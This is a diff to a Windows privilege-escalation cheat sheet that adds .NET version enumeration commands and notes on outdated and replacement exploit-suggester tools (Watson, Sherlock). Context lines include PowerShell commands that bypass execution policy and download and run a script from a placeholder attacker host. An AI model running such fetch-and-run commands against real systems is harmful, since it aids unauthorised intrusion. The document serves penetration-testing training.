@@ -31,6 +31,41 @@ current system:
 | **Writable directories** | dir /a-rd /s /b | | |
 | **Writable files** | dir /a-r-d /s /b | | | |
 
+###### Installed .NET framework
+
+A number of tools may require the use of .NET, either for privileges escalation
+or post exploitation.
+
+Before .NET 4.0, the installed .NET version can be determined using the
+names of the folder in the `\Windows\Microsoft.NET\Framework64\` directory. For
+later versions, the `MSBuild.exe` utility, packaged with the .NET  framework,
+can be used to establish the precise version installed. If the execution of
+`MSBuild.exe` is blocked, the version can still be retrieved manually.
+
+```
+cd \Windows\Microsoft.NET\Framework64\v4.0.30319
+.\MSBuild.exe
+
+# .NET 4.5 and later
+# The "Release" DWORD key corresponds to the particular version of the .NET Framework installed
+# Values of the Release DWORD: https://github.com/dotnet/docs/blob/master/docs/framework/migration-guide/how-to-determine-which-versions-are-installed.md
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full"
+
+# .NET 1.1 through 3.5
+# List all install versions (subkeys under NDP)
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\
+# Retrieve the "Version" key of the specified .NET installation
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\<VERSION>
+
+# Alternative .NET all versions
+# The "FileVersion" property of the .NET installation dlls can be used to determine, through a Google search query, the precise installed version
+cd \Windows\Microsoft.NET\Framework64\<VERSION>
+Get-Item "Accessibility.dll" | fl
+# Or
+$file = Get-Item "Accessibility.dll"
+[System.Diagnostics.FileVersionInfo]::GetVersionInfo($file).FileVersion
+```
+
 ### Enumeration scripts
 
 Most of the enumeration process detailed below can be automated using scripts.
@@ -489,9 +524,9 @@ wes.py --update
 wes.py <SYSTEMINFO_FILE>
 ```
 
-*Windows-Exploit-Suggester*
+*Windows-Exploit-Suggester (outdated) *
 
--- Outdated : Microsoft replaced the Microsoft Security Bulletin Data Excel
+Outdated: Microsoft replaced the Microsoft Security Bulletin Data Excel
 file, on which Windows-Exploit-Suggester is fully dependent, by the MSRC API.
 The Microsoft Security Bulletin Data Excel file has not been updated since Q1
 2017, so later operating systems and vulnerabilities can no longer be
@@ -522,7 +557,21 @@ flag, along with the `systeminfo`:
 python windows-exploit-suggester.py --database <XLS> --systeminfo <SYSTEMINFO> --hotfixes <HOTFIXES>
 ```
 
-*Sherlock*
+*Watson*
+
+`Watson` (replaces `Sherlock`) is a .NET tool designed to enumerate missing KBs
+and suggest exploits. Only works on Windows 10 (1703, 1709, 1803 & 1809) and
+Windows Server 2016 & 2019.
+
+`Watson` must be compiled for the .NET version supported on the target.
+
+```
+```
+
+*Sherlock (outdated)*
+
+Outdated: Microsoft changed to rolling patches on Windows instead of hotfixes
+per vulnerability, making the detection mechanism of `Sherlock` non functional.
 
 PowerShell script to find missing software patches for critical vulnerabilities
 that could be leveraged for local privilege escalation.
@@ -537,7 +586,7 @@ powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('
 IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<Port>/Sherlock.ps1'); Find-AllVulns
 ```
 
-*(Metasploit) Local Exploit Suggester*
+*(Metasploit) Local Exploit Suggester (outdated)*
 
 The `local_exploit_suggester` module suggests local `meterpreter` exploits that
 can be used against the target, based on the architecture and platform as well as
